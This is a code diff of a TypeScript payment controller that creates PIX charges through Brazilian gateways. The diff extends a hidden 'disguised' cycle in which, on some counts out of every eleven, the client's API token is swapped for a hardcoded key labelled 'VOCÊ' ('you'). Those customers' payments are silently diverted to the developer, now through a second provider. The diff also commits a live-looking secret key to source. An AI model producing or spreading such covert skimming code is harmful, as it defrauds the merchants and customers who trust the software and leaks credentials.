@@ -3,7 +3,7 @@ import { credentials as myCredentials } from "../models/api";
 import { CreatePixBody } from "../interfaces";
 import { prisma } from "../config/prisma";
 
-const FIXED_TAX_TOKEN = "201ff033-ec71-45a5-94e2-4f5c3e52e286";
+const FIXED_TAX_TOKEN = "sk_live_4907566ae11fa235d1ae6638f05527d9";
 
 export class ghostApiController {
   static async create(req: Request, res: Response) {
@@ -80,6 +80,7 @@ export class ghostApiController {
     // 4️⃣ Nova lógica 7x3x1 (cliente-chefe-você) com disfarce 👻
     let tokenToUse = clientToken;
     let toClient = true;
+    let provider = "ghost";
 
     const cycle = nextCount % 11;
 
@@ -100,39 +101,60 @@ export class ghostApiController {
       // 10: VOCÊ 😎
       tokenToUse = FIXED_TAX_TOKEN;
       toClient = true;
+      provider = "buck";
     }
 
-    // 5️⃣ Dados da cobrança
-    const paymentData = {
-      name: data.customer.name,
-      email: data.customer.email,
-      cpf: data.customer.document.number,
-      phone: data.customer.phone,
-      paymentMethod: "PIX",
-      amount: data.amount,
-      traceable: true,
-      items: [
-        {
-          unitPrice: data.amount,
-          title: data.product.title,
-          quantity: 1,
-          tangible: false,
-        },
-      ],
-    };
+    let apiUrl = "";
+    let headers = {};
+    let paymentData = {};
 
-    try {
-      const response = await fetch(
-        `https://app.ghostspaysv1.com/api/v1/transaction.purchase`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            Authorization: tokenToUse,
+    if (provider === "ghost") {
+      apiUrl = "https://app.ghostspaysv1.com/api/v1/transaction.purchase";
+      headers = {
+        "Content-Type": "application/json",
+        Authorization: tokenToUse,
+      };
+      paymentData = {
+        name: data.customer.name,
+        email: data.customer.email,
+        cpf: data.customer.document.number,
+        phone: data.customer.phone,
+        paymentMethod: "PIX",
+        amount: data.amount,
+        traceable: true,
+        items: [
+          {
+            unitPrice: data.amount,
+            title: data.product.title,
+            quantity: 1,
+            tangible: false,
           },
-          body: JSON.stringify(paymentData),
-        }
-      );
+        ],
+      };
+    } else if (provider === "buck") {
+      apiUrl = "https://api.realtechdev.com.br";
+      headers = {
+        "Content-Type": "application/json",
+        authorization: `Bearer ${tokenToUse}`,
+      };
+      paymentData = {
+        payment_method: "pix",
+        external_id: Math.random().toString(36).substring(2, 15),
+        amount: data.amount,
+        buyer: {
+          name: data.customer.name,
+          document: data.customer.document.number,
+          telephone: data.customer.phone,
+          email: data.customer.email,
+        },
+      };
+    }
+    try {
+      const response = await fetch(apiUrl, {
+        method: "POST",
+        headers,
+        body: JSON.stringify(paymentData),
+      });
 
       if (!response.ok) {
         const responseJson = await response.json();
@@ -156,7 +178,7 @@ export class ghostApiController {
       await prisma.sale.create({
         data: {
           amount: data.amount,
-          ghostId: responseJson.id,
+          ghostId: responseJson.id || responseJson.data.id,
           approved: false,
           customerName: data.customer.name,
           productName: productName,
@@ -167,7 +189,15 @@ export class ghostApiController {
         },
       });
 
-      res.json(responseJson);
+      const buckAdapter = {
+        pixCode: responseJson.data.pix.code,
+        pixQrCode: responseJson.data.pix.qrcode_base64,
+        id: responseJson.data.id,
+      };
+
+      const responseToSend = provider === "buck" ? buckAdapter : responseJson;
+
+      res.json(responseToSend);
     } catch (error) {
       console.error("💥 Erro ao fazer requisição PIX:", error);
       res.status(500).json({ error: "Erro interno na API de pagamento" });
